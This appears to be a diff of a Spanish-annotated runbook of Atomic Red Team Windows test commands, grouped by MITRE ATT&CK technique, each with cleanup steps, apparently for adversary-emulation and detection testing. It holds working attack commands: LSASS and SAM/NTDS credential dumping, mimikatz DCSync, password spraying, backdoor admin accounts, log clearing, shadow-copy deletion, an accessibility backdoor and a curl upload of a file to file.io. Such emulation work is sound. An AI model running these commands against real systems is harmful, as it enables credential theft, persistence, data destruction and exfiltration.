@@ -1,31 +1,27 @@
 ################T1003.001.md################
 
-## Atomic Test #1 - Dump LSASS.exe Memory using ProcDump
-
-cd Procdump
-procdump.exe -accepteula -ma lsass.exe .\T1003-001.dmp
-
-#Borrado
-del T1003-001.dmp >nul 2> nul
+##Atomic Test #1 - Dump LSASS.exe Memory using ProcDump
 
 
-## Atomic Test #3 - Dump LSASS.exe Memory using direct system calls and API unhooking
-
-cd Outflank-Dumpert
-Outflank-Dumpert.exe
+```cd Procdump```
+```procdump.exe -accepteula -ma lsass.exe .\T1003-001.dmp```
 
 #Borrado
-del C:\windows\temp\dumpert.dmp >nul 2> nul
+```del T1003-001.dmp >nul 2> nul```
 
-## Atomic Test #4 - Dump LSASS.exe Memory using NanoDump
-## Atomic Test #6 - Offline Credential Theft With Mimikatz
-## Atomic Test #7 - LSASS read with pypykatz
-## Atomic Test #9 - Create Mini Dump of LSASS.exe using ProcDump
+
+##Atomic Test #3 - Dump LSASS.exe Memory using direct system calls and API unhooking
+
+```cd Outflank-Dumpert```
+```Outflank-Dumpert.exe```
+
+#Borrado
+```del C:\windows\temp\dumpert.dmp >nul 2> nul```
 
 
 ################T1003.002.md################
 
-## Atomic Test #1 - Registry dump of SAM, creds, and secrets
+##Atomic Test #1 - Registry dump of SAM, creds, and secrets
 
 reg save HKLM\sam %temp%\sam
 reg save HKLM\system %temp%\system
@@ -36,16 +32,14 @@ del %temp%\sam >nul 2> nul
 del %temp%\system >nul 2> nul
 del %temp%\security >nul 2> nul
 
-## Atomic Test #2 - Registry parse with pypykatz
-
-## Atomic Test #3 - esentutl.exe SAM copy
+##Atomic Test #3 - esentutl.exe SAM copy
 
 esentutl.exe /y %SystemRoot%\system32\config\SAM /d %temp%\SAM
 
 #Borrado
 del%temp%\SAM
 
-## Atomic Test #5 - dump volume shadow copy hives with certutil
+##Atomic Test #5 - dump volume shadow copy hives with certutil
 
 for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 >nul 2>&1) && dir /B %temp%\SAMvss%a
 
@@ -54,12 +48,12 @@ for /L %a in (1,1,10) do @(del %temp%\SAMvss%a >nul 2>&1)
 
 ################T1003.003.md ################
 
-## Atomic Test #1 - Create Volume Shadow Copy with vssadmin
+##Atomic Test #1 - Create Volume Shadow Copy with vssadmin
 
 reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
 vssadmin.exe create shadow /for=C:
 
-## Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy
+##Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy
 
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
@@ -70,7 +64,7 @@ del "C:\Windows\Temp\ntds.dit"        >nul 2> nul
 del "C:\Windows\Temp\VSC_SYSTEM_HIVE" >nul 2> nul
 del "C:\Windows\Temp\SYSTEM_HIVE"     >nul 2> nul
 
-## Atomic Test #3 - Dump Active Directory Database with NTDSUtil
+##Atomic Test #3 - Dump Active Directory Database with NTDSUtil
 
 mkdir C:\Windows\Temp\ntds_T1003
 ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
@@ -81,6 +75,8 @@ rmdir /q /s C:\Windows\Temp\ntds_T1003 >nul 2>&1
 
 ################T1003.004.md################
 
+##Atomic Test #1 - Dumping LSA Secrets
+
 cd PsExec
 PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
 
@@ -89,28 +85,67 @@ del %temp%\secrets >nul 2> nul
 
 ################T1003.005.md################
 
-#### Attack Commands: Run with `command_prompt`! 
+##Atomic Test #1 - Cached Credential Dump via Cmdkey
 
 cmdkey /list
 
 ################T1003.006.md################
 
-## Atomic Test #1 - DCSync (Active Directory)
+##Atomic Test #1 - DCSync (Active Directory)
 
 cd mimikatz
 mimikatz.exe "lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%" "exit"
 
 ################T1003.md################
 
+##Atomic Test #1 - Gsecdump
 
-T1007.md
+cd gsecdump
+"gsecdump.exe" -a
+
+################T1007.md################
+
+##Atomic Test #1 - System Service Discovery
+
+tasklist.exe
+sc query
+sc query state= all
+
+
 T1010.md
-T1012.md
+################T1012.md################
+
+##Atomic Test #1 - Query Registry
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
+reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
+reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components"
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup"
+
 T1016.md
 T1018.md
+
 ################T1021.001.md################
 
-## Atomic Test #3 - Changing RDP Port to Non Standard Port via Command_Prompt
+##Atomic Test #3 - Changing RDP Port to Non Standard Port via Command_Prompt
 
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 /f
 netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489
@@ -121,24 +156,134 @@ netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
 net stop TermService /y >nul 2>&1
 net start TermService >nul 2>&1
 
-## Atomic Test #4 - Disable NLA for RDP via Command Prompt
+##Atomic Test #4 - Disable NLA for RDP via Command Prompt
 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f
 
 #Borrado
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 1 /t REG_DWORD -f >nul 2>&1
 
+################T1021.002.md################
 
-T1021.002.md
-T1027.004.md
-T1027.md
+##Atomic Test #1 - Map admin share
+
+cmd.exe /c "net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator
+
+##Atomic Test #3 - Copy and Execute File with PsExec
+
+cd PsExec
+PsExec.exe \\localhost -accepteula -c C:\Windows\System32\cmd.exe
+
+##Atomic Test #4 - Execute command writing output to local Admin Share
+
+cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1
+
+################T1027.004.md################
+
+##Atomic Test #1 - Compile After Delivery using csc.exe
+
+#necesitamos los archivos en el directorio
+cp T1027.004.exe C:\Windows\Temp\T1027.004.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\T1027.004.exe "calc.cs"
+
+#Borrado
+del C:\Windows\Temp\T1027.004.exe >nul 2>&1
+
+################T1027.md################
+
+##Atomic Test #4 - Execution from Compressed File
+
+"T1027.exe"
+
+#Borrado
+taskkill /f /im calculator.exe >nul 2>nul
+taskkill /f /im CalculatorApp.exe >nul 2>nul
+
 T1033.md
-T1036.003.md
-T1036.004.md
-T1037.001.md
+################T1036.003.md################
+
+##Atomic Test #1 - Masquerading as Windows LSASS process
+
+copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
+%SystemRoot%\Temp\lsass.exe /B
+
+#Borrado
+del /Q /F %SystemRoot%\Temp\lsass.exe >nul 2>&1
+
+##Atomic Test #3 - Masquerading - cscript.exe running as notepad.exe
+
+copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y
+cmd.exe /c %APPDATA%\notepad.exe /B
+
+#Borrado
+del /Q /F %APPDATA%\notepad.exe >nul 2>&1
+
+################T1036.004.md################
+
+##Atomic Test #1 - Creating W32Time similar named service using schtasks
+
+schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f
+schtasks /query /tn win32times
+
+#Borrado
+schtasks /tn win32times /delete /f
+
+################T1037.001.md################
+
+##Atomic Test #1 - Logon Scripts
+
+echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+
+#Borrado
+REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f >nul 2>&1
+del %temp%\art.bat >nul 2>&1
+del "%USERPROFILE%\desktop\T1037.001-log.txt" >nul 2>&1
+
 T1039.md
-T1040.md
-T1047.md
+
+################T1040.md################
+
+##Atomic Test #4 - Windows Internal Packet Capture
+
+netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
+
+#Borrado
+netsh trace stop >nul 2>&1
+TIMEOUT /T 5 >nul 2>&1
+del %temp%\trace.etl >nul 2>&1
+del %temp%\trace.cab >nul 2>&1
+
+##Atomic Test #5 - Windows Internal pktmon capture
+
+pktmon.exe start --etw  -f %TEMP%\t1040.etl
+TIMEOUT /T 5 >nul 2>&1
+pktmon.exe stop
+
+#Borrado
+del %TEMP%\t1040.etl
+
+##Atomic Test #6 - Windows Internal pktmon set filter
+
+pktmon.exe filter add -p 445
+
+#Borrado
+pktmon filter remove
+
+################T1047.md################
+
+##Atomic Test #1 - WMI Reconnaissance Users
+
+wmic useraccount get /ALL /format:csv
+
+##Atomic Test #2 - WMI Reconnaissance Processes
+
+wmic process get caption,executablepath,commandline /format:csv
+
+##Atomic Test #3 - WMI Reconnaissance Software
+
+wmic qfe get description,installedOn /format:csv
+
 ################T1048.002.md################
 
 #Atomic Test #1 - Exfiltrate data HTTPS using curl windows#
@@ -148,56 +293,399 @@ cp curl.exe C:\Windows\System32\Curl.exe
 C:\Windows\System32\Curl.exe -F 'file=@artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
 
 T1049.md
-T1053.002.md
-T1053.005.md
+################T1053.002.md################
+
+##Atomic Test #1 - At.exe Scheduled task
+
+at 13:20 /interactive cmd
+
+################T1053.005.md################
+
+##Atomic Test #1 - Scheduled Task Startup Script
+
+schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
+schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
+
+#Borrado
+schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
+schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
+
+##Atomic Test #2 - Scheduled task Local
+
+SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
+
+#Borrado
+SCHTASKS /Delete /TN spawn /F >nul 2>&1
+
 T1055.004.md
-T1055.md
+
+################T1055.md################
+
+##Atomic Test #2 - Remote Process Injection in LSASS via mimikatz
+
+cp mimikatz\mimikatz.exe %tmp%\mimikatz\x64\mimikatz.exe
+cd PsExec
+"PsExec.exe" /accepteula \\DC1 -c %tmp%\mimikatz\x64\mimikatz.exe "lsadump::lsa /inject /id:500" "exit"
+
 T1057.md
 T1059.001.md
-T1059.003.md
-T1059.007.md
+################T1059.003.md################
+
+##Atomic Test #2 - Writes text to a file and displays it
+
+echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"
+
+#Borrado
+del "%TEMP%\test.bin" >nul 2>&1
+
+##Atomic Test #4 - Simulate BlackByte Ransomware Print Bombing
+
+cmd /c "for /l %x in (1,1,80) do start wordpad.exe /p T1059_003note.txt"
+
+#Borrado
+taskkill /F /IM wordpad.exe
+
+
+################T1059.007.md################
+
+##Atomic Test #2 - JScript execution to gather local computer information via wscript
+
+#tener el sys_info.js en a carpeta
+wscript sys_info.js
+
 T1069.001.md
 T1069.002.md
-T1070.001.md
-T1070.004.md
+################T1070.001.md################
+
+##Atomic Test #1 - Clear Logs
+
+wevtutil cl System
+
+################T1070.004.md################
+
+##Atomic Test #5 - Delete an entire folder - Windows cmd
+
+mkdir %temp%\deleteme_T1551.004
+echo deleteme_T1551.004 >> %temp%\deleteme_T1551.004\deleteme_T1551.004
+rmdir /s /q %temp%\deleteme_T1551.004
+
 T1070.005.md
-T1070.md
-T1071.001.md
+
+################T1070.md################
+
+##Atomic Test #1 - Indicator Removal using FSUtil
+
+fsutil usn deletejournal /D C:
+
+#Borrado
+fsutil usn createjournal m=1000 a=100 c:
+
+################T1071.001.md################
+
+##Atomic Test #2 - Malicious User Agents - CMD
+
+cp curl.exe C:\Windows\System32\Curl.exe
+C:\Windows\System32\Curl.exe -s -A "HttpBrowser/1.0" -m3 www.google.com >nul 2>&1
+C:\Windows\System32\Curl.exe -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com >nul 2>&1
+C:\Windows\System32\Curl.exe -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com >nul 2>&1
+C:\Windows\System32\Curl.exe -s -A "*<|>*" -m3 www.google.com >nul 2>&1
+
 T1072.md
-T1078.001.md
-T1078.003.md
+################T1078.001.md################
+
+##Atomic Test #1 - Enable Guest account with RDP capability and admin privileges
+
+net user guest /active:yes
+net user guest Password123!
+net localgroup Administrators guest /add
+net localgroup "Remote Desktop Users" guest /add
+reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+
+#Borrado
+net user guest /active:no >nul 2>&1
+net localgroup Administrators guest /delete >nul 2>&1
+net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+if 0 NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
+if 0 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
+if 0 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+
+##Atomic Test #2 - Activate Guest Account
+
+net user guest /active:yes
+
+#Borrado
+net user guest /active:no
+
+################T1078.003.md################
+
+##Atomic Test #1 - Create local account with admin privileges
+
+net user art-test /add
+net user art-test -4RTisCool!-321
+net localgroup administrators art-test /add
+
+#Borrado
+net localgroup administrators art-test /delete >nul 2>&1
+net user art-test /delete >nul 2>&1
+
 T1082.md
 T1083.md
 T1087.001.md
-T1087.002.md
-T1098.md
-T1105.md
+################T1087.002.md################
+
+##Atomic Test #1 - Enumerate all accounts (Domain)
+
+net user /domain
+net group /domain
+
+##Atomic Test #3 - Enumerate logged on users via CMD (Domain)
+
+query user /SERVER:%COMPUTERNAME%
+
+##Atomic Test #5 - Adfind -Listing password policy
+
+cd Adfind
+"AdFind.exe" -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
+
+##Atomic Test #7 - Adfind - Enumerate Active Directory User Objects
+
+cd Adfind
+"AdFind.exe" -f (objectcategory=person)
+
+################T1090.003.md################
+
+##Atomic Test #1 - Psiphon (Necesitamos el ejecutable y el bat dentro de la carpeta) REGRESAR POR DEFECTO LOS NAVEGADORES
+
+cd Psiphon
+Psiphon.bat
+
+##Atomic Test #2 - Tor Proxy Usage - Windows
+
+cd Tor
+#Ejecutar tor
+
+################T1098.md################
+
+##Atomic Test #9 - Password Change on Directory Service Restore Mode (DSRM) Account
+
+ntdsutil "set dsrm password" "sync from domain account %username%" "q" "q"
+
+
+################T1105.md################
+
+##Atomic Test #7 - certutil download (urlcache)
+
+cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt ART-license.txt
+
+#Borrado
+del ART-license.txt >nul 2>&1
+
+##Atomic Test #9 - Windows - BITSAdmin BITS Download
+
+C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt ART-license.txt
+
+#Borrado
+del ART-license.txt >nul 2>&1
+
+##Atomic Test #11 - OSTAP Worming Activity
+
+pushd \\localhost\C$
+echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
+CScript.exe AtomicTestT1105.js //E:JScript
+del AtomicTestT1105.js /Q >nul 2>&1
+del AtomicTestFileT1105.js /Q >nul 2>&1
+popd
+
 T1106.md
-T1110.001.md
-T1110.002.md
-T1110.003.md
+
+################T1110.001.md################
+
+##Atomic Test #4 - Password Brute User using Kerbrute Tool
+cd kerbrute
+.\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1
+
+
+################T1110.002.md################
+
+##Atomic Test #1 - Password Cracking with Hashcat
+
+#sam.txt y password.lst deben estar en la carpeta
+cd hashcat
+hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule sam.txt password.lst
+
+
+
+################T1110.003.md################
+
+##Atomic Test #1 - Password Spray all Domain Users
+
+#se necesita parse_net_users.bat en temp
+@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2020" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\IPC$ > NUL
+
+
 T1112.md
-T1115.md
-T1119.md
-T1123.md
+################T1115.md################
+
+##Atomic Test #1 - Utilize Clipboard to store or execute commands from
+
+dir | clip
+echo "T1115" > %temp%\T1115.txt
+clip < %temp%\T1115.txt
+
+#Borrado
+del %temp%\T1115.txt >nul 2>&1
+
+################T1119.md################
+
+##Atomic Test #1 - Automated Collection Command Prompt
+
+mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
+dir c: /b /s .docx | findstr /e .docx
+for /R c:\ %f in (*.docx) do copy /Y %f %temp%\T1119_command_prompt_collection
+
+#Borrado
+del %temp%\T1119_command_prompt_collection /F /Q >nul 2>&1
+
+##Atomic Test #4 - Recon information for export with Command Prompt
+sc query type=service > %TEMP%\T1119_1.txt
+doskey /history > %TEMP%\T1119_2.txt
+wmic process list > %TEMP%\T1119_3.txt
+tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
+
+#Borrado
+del %TEMP%\T1119_1.txt >nul 2>&1
+del %TEMP%\T1119_2.txt >nul 2>&1
+del %TEMP%\T1119_3.txt >nul 2>&1
+del %TEMP%\T1119_4.txt >nul 2>&1
+
+################T1123.md################
+
+##Atomic Test #2 - Registry artefact when application use microphone
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
+
+#Borrado
+reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /f
+
+
 T1124.md
-T1125.md
+################T1125.md################
+
+##Atomic Test #1 - Registry artefact when application use webcam
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
+
+#Borrado
+reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /f
+
+
 T1127.001.md
 T1127.md
-T1134.005.md
+################T1134.005.md################
+
+##Atomic Test #1 - Injection SID-History with mimikatz
+
+cd mimikatz
+mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username" "exit"
+
+#Borrado
+mimikatz.exe "sid::clear /sam:$env:username" "exit"
+
 T1135.md
 T1136.001.md
-T1136.002.md
+
+################T1136.002.md################
+
+##Atomic Test #1 - Create a new Windows domain admin user
+
+net user "T1136.002_Admin" "T1136_pass123!" /add /domain
+net group "Domain Admins" "T1136.002_Admin" /add /domain
+
+#Borrado
+net user "T1136.002_Admin" >nul 2>&1 /del /domain
+
+##Atomic Test #2 - Create a new account similar to ANONYMOUS LOGON
+
+net user "ANONYMOUS LOGON" "T1136_pass123!" /add /domain
+
+#Borrado
+net user "ANONYMOUS LOGON" >nul 2>&1 /del /domain
+
+
 T1137.004.md
 T1137.md
-T1140.md
-T1195.md
+
+################T1140.md################
+
+##Atomic Test #1 - Deobfuscate/Decode Files Or Information
+
+certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt
+certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
+
+#Borrado
+del %temp%\T1140_calc.txt >nul 2>&1
+del %temp%\T1140_calc_decoded.exe >nul 2>&1
+
+
+##Atomic Test #2 - Certutil Rename and Decode
+
+copy %windir%\system32\certutil.exe %temp%\tcm.tmp
+%temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt
+%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
+
+#Borrado
+del %temp%\tcm.tmp >nul 2>&1
+del %temp%\T1140_calc2.txt >nul 2>&1
+del %temp%\T1140_calc2_decoded.exe >nul 2>&1
+
+################T1195.md################
+
+##Atomic Test #1 - Octopus Scanner Malware Open Source Supply Chain
+
+#crear $env:TEMP\ExplorerSync.db
+
+copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db
+schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f
+
+#Borrado
+schtasks /delete /tn ExplorerSync /F 2>null
+del %temp%\..\Microsoft\ExplorerSync.db 2>null
+del %temp%\ExplorerSync.db 2>null
+
 T1197.md
 T1201.md
 T1202.md
-T1204.002.md
+
+################T1204.002.md################
+
+##Atomic Test #2 - OSTap Payload Download
+
+echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js
+cscript //E:Jscript %TEMP%\OSTapGet.js
+
+#Borrado
+del %TEMP%\OSTapGet.js /F /Q >nul 2>&1
+
+##Atomic Test #8 - Potentially Unwanted Applications (PUA)
+
+#Descargar http://amtso.eicar.org/PotentiallyUnwanted.exe
+
+#Borrado
+Detener y eliminar 
+
 T1216.001.md
-T1216.md
+################T1216.md################
+
+##Atomic Test #2 - manage-bde.wsf Signed Script Command Execution
+
+set comspec=%windir%\System32\calc.exe
+cscript %windir%\System32\manage-bde.wsf
+
+#Borrado
+set comspec=%windir%\System32\cmd.exe
+
 T1217.md
 T1218.001.md
 T1218.002.md
@@ -211,60 +699,389 @@ T1218.011.md
 T1218.md
 T1220.md
 T1221.md
-T1222.001.md
+
+################T1222.001.md################
+
+##Atomic Test #1 - Take ownership using takeown utility
+
+mkdir %temp%\T1222.001_takeown_folder
+echo T1222.001_takeown1 >> %temp%\T1222.001_takeown_folder\T1222.001_takeown1.txt
+echo T1222.001_takeown2 >> %temp%\T1222.001_takeown_folder\T1222.001_takeown2.txt
+takeown.exe /f %temp%\T1222.001_takeown_folder /r
+
+##Atomic Test #2 - cacls - Grant permission to specified user or group recursively
+
+mkdir %temp%\T1222.001_cacls
+echo T1222.001_cacls1 >> %temp%\T1222.001_cacls\T1222.001_cacls1.txt
+echo T1222.001_cacls2 >> %temp%\T1222.001_cacls\T1222.001_cacls2.txt
+icacls.exe %temp%\T1222.001_cacls /grant Everyone:F
+
 T1482.md
 T1484.001.md
-T1485.md
+
+################T1485.md################
+
+##Atomic Test #3 - Overwrite deleted data on C drive
+
+cipher.exe /w:C:
+
+
 T1486.md
-T1489.md
-T1490.md
+################T1489.md################
+
+##Atomic Test #1 - Windows - Stop service using Service Controller
+
+sc.exe stop spooler
+
+#Borrado
+sc.exe start spooler >nul 2>&1
+
+##Atomic Test #2 - Windows - Stop service using net.exe
+
+net.exe stop spooler
+
+#Borrado
+net.exe start spooler >nul 2>&1
+
+################T1490.md################
+
+##Atomic Test #2 - Windows - Delete Volume Shadow Copies via WMI
+
+wmic.exe shadowcopy delete
+
+##Atomic Test #3 - Windows - wbadmin Delete Windows Backup Catalog
+
+wbadmin delete catalog -quiet
+
+
 T1505.003.md
 T1505.004.md
 T1518.001.md
 T1518.md
-T1529.md
-T1531.md
-T1543.003.md
+################T1529.md################
+
+##Atomic Test #1 - Shutdown System - Windows
+
+shutdown /s /t 1
+
+##Atomic Test #2 - Restart System - Windows
+
+shutdown /r /t 1
+
+##Atomic Test #10 - Logoff System - Windows
+shutdown /l
+
+################T1531.md################
+
+##Atomic Test #1 - Change User Password - Windows
+
+net user AtomicAdministrator User2ChangePW! /add
+net.exe user AtomicAdministrator HuHuHUHoHo283283@dJD
+
+#Borrado
+net.exe user AtomicAdministrator /delete >nul 2>&1
+
+##Atomic Test #2 - Delete User - Windows
+
+net user AtomicUser User2DeletePW! /add
+net.exe user AtomicUser /delete
+
+################T1543.003.md################
+
+##Atomic Test #2 - Service Installation CMD
+
+sc.exe create AtomicTestService_CMD binPath= "AtomicService.exe" start=auto  type=interact
+sc.exe start AtomicTestService_CMD
+
+#Borrado
+sc.exe stop AtomicTestService_CMD >nul 2>&1
+sc.exe delete AtomicTestService_CMD >nul 2>&1
+
+
 T1546.001.md
+
+##Atomic Test #1 - Change Default File Association
+
+assoc .hta=txtfile
+
+#Borrado
+assoc  .hta=htafile
+
+
 T1546.002.md
 T1546.007.md
-T1546.008.md
-T1546.010.md
-T1546.011.md
+
+################T1546.008.md################
+
+##Atomic Test #3 - Create Symbolic Link From osk.exe to cmd.exe
+
+IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
+takeown /F %windir%\System32\osk.exe /A
+icacls %windir%\System32\osk.exe /grant Administrators:F /t
+del %windir%\System32\osk.exe
+mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
+
+#Borrado
+takeown /F %windir%\System32\osk.exe /A
+icacls %windir%\System32\osk.exe /grant Administrators:F /t
+del %windir%\System32\osk.exe
+copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe
+icacls %windir%\system32\osk.exe /inheritance:d
+icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller"
+icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t
+icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
+icacls %windir%\system32\osk.exe /grant:r Administrators:RX
+
+################T1546.010.md################
+
+##Atomic Test #1 - Install AppInit Shim
+
+#debemos tener los reg en la carpeta
+cp T1546.010.dll C:\Tools\T1546.010.dll
+cp T1546.010.dll C:\Tools\T1546.010x86.dll"
+reg.exe import "T1546.010.reg"
+
+#Borrado
+reg.exe import "T1546.010-cleanup.reg" >nul 2>&1
+
+################T1546.011.md################
+
+##Atomic Test #1 - Application Shim Installation
+
+#debemos tener los archivos en en la carpeta
+cp AtomicTest.dll c:\Tools\AtomicTest.dll
